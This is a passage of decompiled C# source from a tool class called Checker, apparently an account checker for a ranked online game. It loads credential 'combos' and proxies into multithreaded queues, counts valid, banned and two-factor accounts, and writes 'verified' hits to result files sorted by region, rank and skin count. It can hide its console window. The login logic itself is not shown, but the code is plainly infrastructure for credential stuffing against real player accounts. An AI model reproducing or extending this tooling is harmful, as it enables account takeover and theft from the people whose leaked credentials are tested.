				"Results/",
				Checker.ResultsFolder,
				"/Verified/NA/10-20/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000077 RID: 119 RVA: 0x00008E94 File Offset: 0x00007094
	private static void nac30(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/NA/20-30/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000078 RID: 120 RVA: 0x00008F10 File Offset: 0x00007110
	private static void nac50(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/NA/30-50/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000079 RID: 121 RVA: 0x00008F8C File Offset: 0x0000718C
	private static void nac80(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/NA/50-80/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600007A RID: 122 RVA: 0x00009008 File Offset: 0x00007208
	private static void nac100(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/NA/80-100/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600007B RID: 123 RVA: 0x00009084 File Offset: 0x00007284
	private static void nac150(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/NA/100-150/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600007C RID: 124 RVA: 0x00009100 File Offset: 0x00007300
	private static void nac200(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/NA/150-200/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600007D RID: 125 RVA: 0x0000917C File Offset: 0x0000737C
	private static void nac2000(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/NA/200++/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600007E RID: 126 RVA: 0x000091F8 File Offset: 0x000073F8
	private static void apc10(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/AP/1-10/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600007F RID: 127 RVA: 0x00009274 File Offset: 0x00007474
	private static void apc20(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/AP/10-20/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000080 RID: 128 RVA: 0x000092F0 File Offset: 0x000074F0
	private static void apc30(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/AP/20-30/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000081 RID: 129 RVA: 0x0000936C File Offset: 0x0000756C
	private static void apc50(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/AP/30-50/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000082 RID: 130 RVA: 0x000093E8 File Offset: 0x000075E8
	private static void apc80(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/AP/50-80/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000083 RID: 131 RVA: 0x00009464 File Offset: 0x00007664
	private static void apc100(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/AP/80-100/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000084 RID: 132 RVA: 0x000094E0 File Offset: 0x000076E0
	private static void apc150(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/AP/100-150/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000085 RID: 133 RVA: 0x0000955C File Offset: 0x0000775C
	private static void apc200(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/AP/150-200/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000086 RID: 134 RVA: 0x000095D8 File Offset: 0x000077D8
	private static void apc2000(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/AP/200++/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000087 RID: 135 RVA: 0x00009654 File Offset: 0x00007854
	private static void euc10(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/EU/1-10/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000088 RID: 136 RVA: 0x000096D0 File Offset: 0x000078D0
	private static void euc20(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/EU/10-20/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000089 RID: 137 RVA: 0x0000974C File Offset: 0x0000794C
	private static void euc30(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/EU/20-30/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600008A RID: 138 RVA: 0x000097C8 File Offset: 0x000079C8
	private static void euc50(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/EU/30-50/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600008B RID: 139 RVA: 0x00009844 File Offset: 0x00007A44
	private static void euc80(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/EU/50-80/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600008C RID: 140 RVA: 0x000098C0 File Offset: 0x00007AC0
	private static void euc100(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/EU/80-100/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600008D RID: 141 RVA: 0x0000993C File Offset: 0x00007B3C
	private static void euc150(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/EU/100-150/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600008E RID: 142 RVA: 0x000099B8 File Offset: 0x00007BB8
	private static void euc200(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/EU/150-200/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600008F RID: 143 RVA: 0x00009A34 File Offset: 0x00007C34
	private static void euc2000(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/EU/200++/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000090 RID: 144 RVA: 0x00009AB0 File Offset: 0x00007CB0
	private static void krc10(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/KR/1-10/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000091 RID: 145 RVA: 0x00009B2C File Offset: 0x00007D2C
	private static void krc20(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/KR/10-20/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000092 RID: 146 RVA: 0x00009BA8 File Offset: 0x00007DA8
	private static void krc30(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/KR/20-30/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000093 RID: 147 RVA: 0x00009C24 File Offset: 0x00007E24
	private static void krc50(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/KR/30-50/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000094 RID: 148 RVA: 0x00009CA0 File Offset: 0x00007EA0
	private static void krc80(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/KR/50-80/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000095 RID: 149 RVA: 0x00009D1C File Offset: 0x00007F1C
	private static void krc100(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/KR/80-100/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000096 RID: 150 RVA: 0x00009D98 File Offset: 0x00007F98
	private static void krc150(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/KR/100-150/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000097 RID: 151 RVA: 0x00009E14 File Offset: 0x00008014
	private static void krc200(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/KR/150-200/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000098 RID: 152 RVA: 0x00009E90 File Offset: 0x00008090
	private static void krc2000(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Verified/KR/200++/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000099 RID: 153 RVA: 0x00009F0C File Offset: 0x0000810C
	private static void RanksV(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Ranks/Verified/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600009A RID: 154 RVA: 0x00009F88 File Offset: 0x00008188
	private static void RanksU(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/Ranks/Unverified/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x0600009B RID: 155 RVA: 0x00002884 File Offset: 0x00000A84
	public static void text(int message)
	{
		Colorful.Console.Write(message);
	}

	// Token: 0x0600009C RID: 156 RVA: 0x0000288D File Offset: 0x00000A8D
	public static void text2(string message)
	{
		Colorful.Console.Write(message);
	}

	// Token: 0x0600009D RID: 157
	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	// Token: 0x0600009E RID: 158
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	// Token: 0x04000001 RID: 1
	private static IntPtr ThisConsole = Checker.GetConsoleWindow();

	// Token: 0x04000002 RID: 2
	private const int HIDE = 0;

	// Token: 0x04000003 RID: 3
	private const int MAXIMIZE = 3;

	// Token: 0x04000004 RID: 4
	private const int MINIMIZE = 6;

	// Token: 0x04000005 RID: 5
	private const int RESTORE = 9;

	// Token: 0x04000006 RID: 6
	private static readonly object obj = new object();

	// Token: 0x04000007 RID: 7
	public static string ResultsFolder = DateTime.Now.ToString("MM-dd-yyyy H.mm");

	// Token: 0x04000008 RID: 8
	public static readonly string ResultsFolder2 = string.Format("{0:MM-dd-yy HH;mm}", DateTime.Now);

	// Token: 0x04000009 RID: 9
	public static int Valid;

	// Token: 0x0400000A RID: 10
	public static int Invalid;

	// Token: 0x0400000B RID: 11
	public static int Errors;

	// Token: 0x0400000C RID: 12
	public static int Free;

	// Token: 0x0400000D RID: 13
	public static int Premium;

	// Token: 0x0400000E RID: 14
	public static int NA;

	// Token: 0x0400000F RID: 15
	public static int EU;

	// Token: 0x04000010 RID: 16
	public static int AP;

	// Token: 0x04000011 RID: 17
	public static int KR;

	// Token: 0x04000012 RID: 18
	public static int unrated;

	// Token: 0x04000013 RID: 19
	public static int iron;

	// Token: 0x04000014 RID: 20
	public static int bronze;

	// Token: 0x04000015 RID: 21
	public static int silver;

	// Token: 0x04000016 RID: 22
	public static int gold;

	// Token: 0x04000017 RID: 23
	public static int plat;

	// Token: 0x04000018 RID: 24
	public static int dia;

	// Token: 0x04000019 RID: 25
	public static int immo;

	// Token: 0x0400001A RID: 26
	public static int radiant;

	// Token: 0x0400001B RID: 27
	public static int unratedu;

	// Token: 0x0400001C RID: 28
	public static int ironu;

	// Token: 0x0400001D RID: 29
	public static int bronzeu;

	// Token: 0x0400001E RID: 30
	public static int silveru;

	// Token: 0x0400001F RID: 31
	public static int goldu;

	// Token: 0x04000020 RID: 32
	public static int platu;

	// Token: 0x04000021 RID: 33
	public static int diau;

	// Token: 0x04000022 RID: 34
	public static int immou;

	// Token: 0x04000023 RID: 35
	public static int radiantu;

	// Token: 0x04000024 RID: 36
	public static int neverplayed;

	// Token: 0x04000025 RID: 37
	public static int twofactor;

	// Token: 0x04000026 RID: 38
	public static int Banned;

	// Token: 0x04000027 RID: 39
	public static int done;

	// Token: 0x04000028 RID: 40
	public static int ten;

	// Token: 0x04000029 RID: 41
	public static int twenty;

	// Token: 0x0400002A RID: 42
	public static int thirty;

	// Token: 0x0400002B RID: 43
	public static int fifty;

	// Token: 0x0400002C RID: 44
	public static int eighty;

	// Token: 0x0400002D RID: 45
	public static int hundred;

	// Token: 0x0400002E RID: 46
	public static int hundred1;

	// Token: 0x0400002F RID: 47
	public static int hundred2;

	// Token: 0x04000030 RID: 48
	public static int hundred3;

	// Token: 0x04000031 RID: 49
	public static int unknown;

	// Token: 0x04000032 RID: 50
	public static int CheckPerSec = 0;

	// Token: 0x04000033 RID: 51
	public static int seconds_gone = 1;

	// Token: 0x04000034 RID: 52
	public static int CPM_aux;

	// Token: 0x04000035 RID: 53
	public static int Skinned;

	// Token: 0x04000036 RID: 54
	public static int unskinned;

	// Token: 0x04000037 RID: 55
	public static int LoadedCombos;

	// Token: 0x04000038 RID: 56
	public static int LoadedProxies;

	// Token: 0x04000039 RID: 57
	public static int ProxiesIndex = 0;

	// Token: 0x0400003A RID: 58
	private static List<Thread> Threads = new List<Thread>();

	// Token: 0x0400003B RID: 59
	private static ConcurrentQueue<string> Combos = new ConcurrentQueue<string>();

	// Token: 0x0400003C RID: 60
	public static List<string> Proxies = new List<string>();
}
